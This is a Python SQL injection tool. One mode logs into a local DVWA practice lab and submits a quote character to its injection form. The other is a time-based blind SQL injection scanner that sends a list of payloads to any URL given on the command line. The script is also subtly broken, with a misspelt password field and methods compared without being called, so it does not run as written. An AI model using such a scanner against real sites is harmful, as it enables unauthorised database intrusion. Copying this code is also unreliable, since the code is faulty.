import mechanize
from bs4 import BeautifulSoup
import time
import requests,argparse,sys
from colorama import *
banner = """

  _________      .__    .___            __               __  .__               
 /   _____/ _____|  |   |   | ____     |__| ____   _____/  |_|__| ____   ____  
 \_____  \ / ____/  |   |   |/    \    |  |/ __ \_/ ___\   __\  |/  _ \ /    \ 
 /        < <_|  |  |__ |   |   |  \   |  \  ___/\  \___|  | |  (  <_> )   |  \
/_______  /\__   |____/ |___|___|  /\__|  |\___  >\___  >__| |__|\____/|___|  /
        \/    |__|               \/\______|    \/     \/                    \/

"""
kek = """
1 = Press 1 for sql Injection
2 = Press 2 for sql analysis
"""
print(banner)
print(kek)
print("Choose an option please")
sorgu = input()
if(sorgu=="1"):
    nav = mechanize.Browser()
    nav.set_handle_robots(False)
    nav.set_handle_equiv(False)
    nav.open("http://localhost/DVWA-master/login.php")

    #for i in nav.forms():
       #print(i)

    nav.addheaders = [('User-Agent','Firefox')]

    nav.select_form(nr=0)

    nav ['username'] = 'admin'
    nav ['passord'] = 'password'

    nav.submit()

    #print(nav.response().read())

    nav.open("http://localhost/DVWA-master/vulnerabilities/sqli/")
    nav.select_form(nr=0)
    nav['id'] = "'"
    nav.submit()
    soup = BeautifulSoup(nav.response().read,"html5lib")
    print("Injection has been executing")
    t = 3
    time.sleep(t)
    print(soup)
elif (sorgu == "2"):
    parser = argparse.ArgumentParser()
    parser.add_argument("-u","--url",help="url",required=True)
    parser.add_argument("-p","--payloads",help="payloads list",required=True)
    args = parser.parse_args()
    def nox(url, payloads):
        for payload in open(payloads, mode="r").readlines():
            new_url = url.replace('{nox}',payload)
            request = requests.get(new_url)
            if request.elapsed.total_seconds > 7:
                print(Style.BRIGHT + Fore.RED +"Timeout detected with",new_url)
            else:
                print(Style.BRIGHT + Fore.BLUE +"Not working with this payload: ",payload)
    def lux(url):
        url_test = url.replace("{nox}", "")
        req = requests.get(url_test)
        if req.elapsed.total_seconds > 6:
            sys.exit(Style.BRIGHT + Fore.RED + "Make sure you have good connection and restart the scanner")
        else:
            nox(args.url, args.payloads)
    if not '{nox}' in args.url:
        sys.exit(Style.BRIGHT + Fore.RED + " Missing {nox} parameter!")
    else:
        lux(args.url)

else:
    print("There is no option like this")